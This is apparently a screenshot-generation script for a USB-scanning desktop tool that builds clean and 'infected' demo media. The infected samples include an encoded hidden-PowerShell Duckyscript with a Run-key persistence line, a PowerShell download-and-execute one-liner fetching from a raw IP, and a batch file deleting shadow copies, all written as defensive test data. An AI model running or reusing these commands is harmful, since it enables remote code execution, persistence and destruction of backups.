#!/usr/bin/env python3
"""Re-render the documentation screenshots from the real interface.

The images in docs/images are produced by running the actual QML interface
offscreen, driving it with a synthetic medium, and grabbing the window.  They
are not mock-ups: every number in them comes from a real run of the pipeline.

    python3 scripts/make-screenshots.py [--output docs/images]

The script builds two sample media in a temporary directory: a clean one that
holds nothing but ordinary documents, and an infected one that adds EICAR, a
Duckyscript payload, an autorun.inf, a double extension, a packed-looking
executable, PowerShell and batch scripts.  Nothing outside the repository is
touched.  Rendering uses the KDE desktop style when it is available.
"""

from __future__ import annotations

import argparse
import os
import shutil
import struct
import sys
import tempfile
import time
from pathlib import Path
from typing import Any

REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO / "src"))

os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
os.environ.setdefault("QT_QUICK_CONTROLS_STYLE", "org.kde.desktop")

from PyQt6.QtCore import Q_ARG, QEventLoop, QObject, QUrl  # noqa: E402
from PyQt6.QtGui import QGuiApplication  # noqa: E402
from PyQt6.QtQml import QQmlApplicationEngine  # noqa: E402
from PyQt6.QtQuick import QQuickWindow  # noqa: E402

import dcs.core.device as device_module  # noqa: E402
import dcs.core.pipeline as pipeline_module  # noqa: E402
import dcs.gui.backend as backend_module  # noqa: E402
from dcs.core.config import load_config  # noqa: E402
from dcs.core.device import BlockDevice  # noqa: E402
from dcs.core.upload.base import UploadResult  # noqa: E402
from dcs.gui.app import find_qml_imports, qml_directory  # noqa: E402
from dcs.gui.backend import Backend  # noqa: E402

WINDOW_WIDTH = 1280
WINDOW_HEIGHT = 860

#: what the "Removable media" list shows in the screenshots
DEMO_DEVICES = (
    BlockDevice(
        name="sdb1",
        path="/dev/sdb1",
        type="part",
        size=16 * 1000**3,
        fstype="vfat",
        label="SANDISK16",
        mountpoints=["/run/media/aleks/SANDISK16"],
        transport="usb",
        removable=True,
        hotplug=True,
        model="Cruzer Blade",
        vendor="SanDisk",
    ),
    BlockDevice(
        name="sdc1",
        path="/dev/sdc1",
        type="part",
        size=32 * 1000**3,
        fstype="exfat",
        label="UNKNOWN-STICK",
        transport="usb",
        removable=True,
        hotplug=True,
        model="DataTraveler",
        vendor="Kingston",
    ),
)


class SilentNotifier:
    """Stands in for notify-send while the screenshots are taken.

    The script runs on a real desktop: taking a screenshot must not pop a
    notification on the maintainer's screen, and notify-send would also block
    this process waiting for an answer nobody is going to give.
    """

    def __init__(self, **kwargs: object) -> None:
        pass

    def available(self) -> bool:
        return False

    def notify(self, *args: object, **kwargs: object) -> str:
        return ""


def make_medium(root: Path, *, nested_files: int = 1500, samples: bool = False) -> None:
    """Write one demo medium, with enough files for progress to move.

    ``samples`` adds the handful of nasty files.  The medium behind the
    ``clean verdict`` screenshot is built without them: a screenshot that
    captions a clean verdict while the findings list shows EICAR is worse than
    no screenshot at all.
    """
    (root / "Documents").mkdir(parents=True, exist_ok=True)
    (root / "Pictures").mkdir(parents=True, exist_ok=True)
    for index in range(nested_files):
        folder = "Documents" if index % 2 else "Pictures"
        (root / folder / f"note-{index:04d}.txt").write_text(
            "holiday notes\n" * 30, encoding="utf-8"
        )

    if samples:
        eicar = (
            b"X5O!P%@AP[4"
            + bytes([92])
            + b"PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
        )
        (root / "eicar.com").write_bytes(eicar)
        (root / "payload.txt").write_text(
            "\n".join(
                [
                    "REM Duckyscript payload",
                    "DELAY 1000",
                    "GUI r",
                    "DELAY 500",
                    "STRING powershell -w hidden -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
                    "ENTER",
                    "DELAY 2000",
                    "STRING reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v updater /d %TEMP%\\\\a.exe",
                    "ENTER",
                ]
            )
            + "\n",
            encoding="utf-8",
        )
        (root / "autorun.inf").write_text("[autorun]\nopen=setup.exe\n", encoding="utf-8")
        setup = bytearray(4096)
        setup[0:2] = b"MZ"
        struct.pack_into("<I", setup, 0x3C, 0x80)
        setup[0x80:0x84] = b"PE\x00\x00"
        struct.pack_into("<HHI", setup, 0x84, 0x8664, 2, 0x5F000000)
        (root / "setup.exe").write_bytes(bytes(setup))
        (root / "invoice.pdf.exe").write_bytes(bytes(setup))
        (root / "update.ps1").write_text(
            "IEX (New-Object Net.WebClient).DownloadString('http://185.11.22.33/a.ps1')\n",
            encoding="utf-8",
        )
        (root / "cleanup.bat").write_text(
            "vssadmin delete shadows /all /quiet\nwmic shadowcopy delete\n", encoding="utf-8"
        )


#: the link the stand-in provider reports, so the screenshots show a link
DEMO_SHARE_LINK = "https://files.catbox.moe/dcs-demo-sandisk16.zip"


class DemoProvider:
    """Stands in for a real upload host while the screenshots are taken.

    Every number in the screenshots has to come from a real pipeline run, but a
    real run would push the demo archive to a public host: the documentation
    would depend on the network, the file would be published for no reason and
    the screenshot itself would leak a live link.  The provider is therefore
    replaced with one that answers exactly like a working host, and the pipeline
    around it is untouched.
    """

    label = "Catbox"
    slug = "catbox"

    def __init__(self, **kwargs: object) -> None:
        pass

    def availability(self) -> tuple[bool, str]:
        return True, ""

    def upload(
        self,
        path: str,
        *,
        progress: Any = None,
        cancel: Any = None,
        part_label: str = "",
    ) -> UploadResult:
        size = os.path.getsize(path)
        if progress is not None:
            progress(size, size)
        return UploadResult(
            ok=True,
            link=DEMO_SHARE_LINK,
            provider=self.label,
            path=str(path),
            size=size,
            duration=1.4,
            detail=f"demo upload{(' ' + part_label) if part_label else ''}",
        )


class Shot:
    """Drives the interface and writes the PNGs."""

    def __init__(self, output: Path) -> None:
        self.output = output
        #: both are filled in by run() with the temporary sample media
        self.medium = Path()
        self.infected = Path()
        self.warnings: list[str] = []

    def run(self) -> int:
        app = QGuiApplication(sys.argv[:1])
        # the clean medium carries nothing but ordinary documents
        medium = Path(tempfile.mkdtemp(prefix="dcs-shot-"))
        (medium / "usb").mkdir()
        make_medium(medium / "usb")
        self.medium = medium / "usb"
        infected = Path(tempfile.mkdtemp(prefix="dcs-shot-bad-"))
        make_medium(infected / "usb", nested_files=60, samples=True)
        self.infected = infected / "usb"

        device_module.list_removable_devices = lambda **_: list(DEMO_DEVICES)
        # The archive is really built and the upload really runs, but against a
        # host that only exists inside this process: see DemoProvider.
        pipeline_module.build_provider = lambda *args, **kwargs: DemoProvider()

        config = load_config(path=str(medium / "config.toml"))
        config.source_path = str(medium / "config.toml")
        config.general.output_dir = str(medium / "out")
        config.report.directory = str(medium / "reports")
        config.upload.enabled = True
        config.email.enabled = False
        config.gui.switch_to_result = False
        # The window is created at its final size.  Resizing it after the first
        # frame makes the grab capture a half laid out window: the footer ends up
        # drawn at the old height and the rest is filled with the clear colour,
        # which is how a footer that really is 48 px tall came out "half visible".
        config.gui.remember_window_size = True
        config.gui.window_width = WINDOW_WIDTH
        config.gui.window_height = WINDOW_HEIGHT

        backend = Backend(config, poll_devices=False)
        engine = QQmlApplicationEngine()
        for path in find_qml_imports():
            engine.addImportPath(path)
        engine.warnings.connect(lambda ws: self.warnings.extend(w.toString() for w in ws))
        engine.rootContext().setContextProperty("backend", backend)
        engine.rootContext().setContextProperty("appVersion", "0.1.0")
        engine.rootContext().setContextProperty("appName", "Ducky Can Shoot")
        engine.load(QUrl.fromLocalFile(os.path.join(qml_directory(), "Main.qml")))
        window = engine.rootObjects()[0]
        window.show()
        self.pump(app, 0.6)
        assert window.property("width") == WINDOW_WIDTH, f"window width {window.property('width')}"
        assert window.property("height") == WINDOW_HEIGHT, (
            f"window height {window.property('height')}"
        )
        backend.refreshDevices()
        backend.selectDevice(0)
        self.tab(window, 0)
        self.shot(window, "home-view.png")

        # a real scan, captured while it runs
        self.tab(window, 1)
        backend.startJob(
            {
                "source": str(self.medium),
                "label": "SANDISK16",
                "scan": True,
                "archive": True,
                "upload": True,
                "email": False,
            }
        )
        captured = False
        deadline = time.time() + 60
        while backend.state == "running" and time.time() < deadline:
            app.processEvents(QEventLoop.ProcessEventsFlag.AllEvents, 20)
            # the scan is well under way once the first samples are in the chart;
            # waiting for a finding would never happen on a clean medium
            if (
                not captured
                and backend.throughput.rowCount() >= 3
                and backend.overallPercent >= 0.20
            ):
                self.shot(window, "live-view.png")
                captured = True
            time.sleep(0.005)
        if not captured:
            self.shot(window, "live-view.png")
        self.wait_for(app, backend, 120)

        self.check_clean(backend)
        self.tab(window, 2)
        self.shot(window, "result-view.png")

        # an infected medium, for the verdict that matters
        self.tab(window, 0)
        backend.startJob(
            {
                "source": str(self.infected),
                "label": "UNKNOWN-STICK",
                "scan": True,
                "archive": False,
                "upload": False,
                "email": False,
            }
        )
        self.wait_for(app, backend, 180)

        self.check_infected(backend)
        self.tab(window, 2)
        self.shot(window, "result-infected.png")

        # the settings page, with the USB detection mode that is being shown off
        config.watch.mode = "notify"
        backend.settingsChanged.emit()
        self.tab(window, 3)
        self.pump(app, 0.3)
        self.shot(window, "settings-view.png")

        # a medium that appeared while the watcher runs (watch.mode notify):
        # the banner is what the notification leads to
        backend_module.DesktopNotifier = SilentNotifier
        backend._on_device_inserted(
            {
                "node": "/dev/sdb1",
                "disk": "/dev/sdb",
                "displayName": "SANDISK16",
                "sizeText": "14.9 GiB",
                "mountPath": DEMO_DEVICES[0].mount_path,
                "summary": f"SANDISK16 ({DEMO_DEVICES[0].size_text}, {DEMO_DEVICES[0].mount_path})",
            }
        )
        self.tab(window, 0)
        self.pump(app, 0.4)
        self.shot(window, "new-medium.png")
        backend.dismissPendingDevice()
        self.tab(window, 3)
        self.pump(app, 0.2)

        # the ClamAV installation dialog
        dialog = window.findChild(QObject, "clamavInstallDialog")
        if dialog is not None:
            dialog.setProperty("visible", True)
            self.pump(app, 0.8)
            self.shot(window, "install-clamav.png")

        shutil.rmtree(medium, ignore_errors=True)
        shutil.rmtree(infected, ignore_errors=True)

        relevant = [w for w in self.warnings if "DrawerHandle" not in w and "bottomMargin" not in w]
        print(f"QML warnings: {len(relevant)}")
        for warning in relevant[:5]:
            print("  -", warning)
        return 1 if relevant else 0

    # -- guards ----------------------------------------------------------
    @staticmethod
    def check_clean(backend: Backend) -> None:
        """Refuse to caption a screenshot as clean when the run found something.

        The screenshots are documentation first and pictures second: a "clean
        verdict" that shows a threat list is a lie about the tool.
        """
        summary = backend.summary
        verdict = str(summary.get("verdict", ""))
        link = str(summary.get("shareLink", ""))
        print(f"clean run: verdict={verdict} findings={backend.findings.count} link={link}")
        assert verdict == "clean", f"the clean medium came out {verdict!r}"
        assert backend.findings.count == 0, (
            f"{backend.findings.count} finding(s) on the clean medium"
        )
        assert int(summary.get("findingCount") or 0) == 0, "the summary reports findings"
        assert link == DEMO_SHARE_LINK, f"the clean run produced no demo link (got {link!r})"

    @staticmethod
    def check_infected(backend: Backend) -> None:
        """Refuse to caption a screenshot as infected when nothing was found."""
        summary = backend.summary
        verdict = str(summary.get("verdict", ""))
        print(f"infected run: verdict={verdict} findings={backend.findings.count}")
        assert verdict in ("infected", "suspicious"), f"the infected medium came out {verdict!r}"
        assert backend.findings.count > 0, "the infected medium produced no findings"
        assert not summary.get("shareLink"), "an infected run must not publish a link"

    # -- helpers ---------------------------------------------------------
    @staticmethod
    def pump(app: QGuiApplication, seconds: float) -> None:
        end = time.time() + seconds
        while time.time() < end:
            app.processEvents(QEventLoop.ProcessEventsFlag.AllEvents, 20)
            time.sleep(0.01)

    @staticmethod
    def tab(window: QObject, index: int) -> None:
        window.metaObject().invokeMethod(window, "showTab", Q_ARG("QVariant", index))

    @staticmethod
    def wait_for(app: QGuiApplication, backend: Backend, seconds: float) -> None:
        deadline = time.time() + seconds
        while backend.state == "running" and time.time() < deadline:
            app.processEvents(QEventLoop.ProcessEventsFlag.AllEvents, 20)
            time.sleep(0.01)

    def shot(self, window: QObject, name: str, *, attempts: int = 4):
        """Grab the window, and refuse to keep a frame that is not fully rendered.

        QQuickWindow.grabWindow() renders whatever the scene graph has synced: if
        the layout changed since the previous frame (a tab switch, the footer
        appearing, a window resize) the first grab can contain a half drawn
        window.  Grabbing twice and checking that the footer is really inside the
        image is what keeps a stale frame out of the documentation.
        """
        app = QGuiApplication.instance()
        image = QQuickWindow.grabWindow(window)
        for attempt in range(1, attempts + 1):
            # The offscreen platform keeps an old copy of the area a widget grew
            # into, so the status bar comes out about a third of its height unless
            # the window is repainted: nudging the size by one pixel and back
            # forces a full repaint.
            window.setProperty("height", WINDOW_HEIGHT + 1)
            self.pump(app, 0.25)
            window.setProperty("height", WINDOW_HEIGHT)
            self.pump(app, 0.35)
            image = QQuickWindow.grabWindow(window)
            if self._frame_is_complete(window, image):
                break
            print(f"   retrying {name}: the frame was not painted completely (attempt {attempt})")
        else:
            raise SystemExit(
                f"{name}: the window never rendered completely (the status bar does not reach the "
                "bottom of the image); refusing to write a half drawn screenshot"
            )

        path = self.output / name
        image.save(str(path))
        colours = {
            image.pixel(x, y)
            for x in range(0, image.width(), 17)
            for y in range(0, image.height(), 17)
        }
        print(f"{name}: {image.width()}x{image.height()} colours={len(colours)}")
        return image

    @staticmethod
    def _frame_is_complete(window: QObject, image: Any) -> bool:
        """True when everything the window should show is inside the image."""
        content = window.contentItem()
        if image.width() != int(content.width()) or image.height() != int(content.height()):
            return False
        status_bar = window.findChild(QObject, "statusBar")
        if status_bar is None or not status_bar.property("visible"):
            return True  # nothing at the bottom to check
        # The status bar is the last row of the page, so its bottom edge has to be
        # the bottom of the window, and its own colour has to reach that edge.  A
        # stale frame leaves the window colour there instead.
        background = image.pixel(4, 4)
        window_colour = image.pixel(image.width() - 4, image.height() - 4)
        bottom = image.pixel(image.width() // 2, image.height() - 2)
        if bottom == background:
            return False
        return not (bottom == window_colour and background == window_colour)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--output",
        default=str(REPO / "docs" / "images"),
        help="directory the PNGs are written to (default: docs/images)",
    )
    args = parser.parse_args()

    output = Path(args.output)
    output.mkdir(parents=True, exist_ok=True)
    shot = Shot(output)
    return shot.run()


if __name__ == "__main__":
    raise SystemExit(main())
